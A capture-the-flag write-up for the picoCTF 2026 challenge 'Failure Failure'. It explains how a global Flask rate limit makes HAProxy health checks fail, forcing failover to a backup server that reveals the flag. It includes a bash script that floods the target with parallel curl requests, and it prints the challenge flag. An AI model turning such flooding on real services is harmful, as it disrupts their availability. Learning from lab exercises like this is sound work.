---
title: "picoCTF 2026 – General Skills: Failure Failure"
date: 2026-03-12
categories:
  - Misc
tags:
  - Misc
  - picoCTF
collections:
  - picoCTF
---

{{< admonition tldr "TL;DR" >}}
**picoCTF 2026 – General Skills: Failure Failure** is a misc challenge from **picoCTF**. This challenge simulates a **high-availability infrastructure** where a load balancer routes traffic between multiple servers.
{{< /admonition >}}

## Overview

This challenge simulates a **high-availability infrastructure** where a load balancer routes traffic between multiple servers.

A **primary server** normally handles all requests, while a **backup server** is only used if the primary server fails. The flag is stored on the backup server.

The goal of this challenge is to **force the load balancer to switch to the backup server**, which will reveal the flag.

---

## Provided Source Code

### Flask Application

```python
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

# Custom key function for global rate limiting
def global_rate_limit_key():
    return "global"

# Initialize rate limiter with global key function
limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

# Custom error handler for rate limit exceeded
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    print("value:", os.getenv("IS_BACKUP"))
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

---

### HAProxy Configuration

```cfg
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

---

## Understanding the Logic

The system uses **HAProxy** as a load balancer.

Two backend servers are configured:

| Server | Port | Role |
|------|------|------|
| s1 | 8000 | Primary |
| s2 | 9000 | Backup |

Normally the request flow is:

```
Client → HAProxy → s1
```

The backup server (**s2**) will only receive traffic if **s1 is considered down**.

---

## Identifying the Vulnerability

The Flask application applies a **rate limit of 300 requests per minute**:

```python
default_limits=["300 per minute"]
```

However, the key used for rate limiting is:

```python
def global_rate_limit_key():
    return "global"
```

This means **all requests share the same rate limit**, including:

- User requests
- HAProxy health check requests

---

## Why This Is a Problem

HAProxy performs **health checks** on the backend server:

```
GET /
```

It expects the server to return:

```
HTTP 200
```

If the rate limit is exceeded, the application returns **429**, but the code converts it into **503**:

```python
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503
```

From HAProxy’s perspective:

```
503 = server failure
```

According to the configuration:

```
fall 2
```

If the health check fails **twice**, HAProxy marks the server as **DOWN**.

When this happens:

```
Client → HAProxy → s2
```

The backup server has the environment variable:

```
IS_BACKUP=yes
```

So it returns the **flag**.

---

## Exploitation Strategy

The attack is straightforward:

1. Send many requests to exceed the rate limit.
2. HAProxy health checks receive **503 responses**.
3. HAProxy marks the primary server (**s1**) as **DOWN**.
4. Traffic is redirected to the backup server (**s2**).
5. The backup server returns the flag.

---

## Exploit Script

The following script automates the attack.

### solve.sh

```bash
#!/bin/bash

URL=$1

if [ -z "$URL" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

cleanup() {
    kill $SPAM_PID 2>/dev/null
    exit 0
}

trap cleanup INT TERM

echo "[*] Target: $URL"
echo "[*] Starting spammer..."

(
while true; do
    seq 800 | xargs -P100 -I{} curl -s $URL > /dev/null
done
) &

SPAM_PID=$!

echo "[*] Watching for flag..."

while true; do
    FLAG=$(curl -s $URL | grep -o 'picoCTF{[^}]*}')
    
    if [ ! -z "$FLAG" ]; then
        echo "[+] FLAG FOUND: $FLAG"
        cleanup
    fi
done
```

---

## Running the Exploit

Make the script executable:

```bash
chmod +x solve.sh
```

Run it with the challenge URL:

```bash
./solve.sh http://mysterious-sea.picoctf.net:53900/
```

Example output:

```
[*] Target: http://mysterious-sea.picoctf.net:53900/
[*] Starting spammer...
[*] Watching for flag...
[+] FLAG FOUND: picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
```

---

## Final Flag

```
picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
```

---

## Key Takeaways

- Global rate limits can affect **internal infrastructure components** like load balancer health checks.
- Misconfigured rate limits can allow attackers to **force failover events**.
- Load balancer health checks should **not share the same rate limit as user traffic**.
- Infrastructure misconfigurations can be just as dangerous as application vulnerabilities.
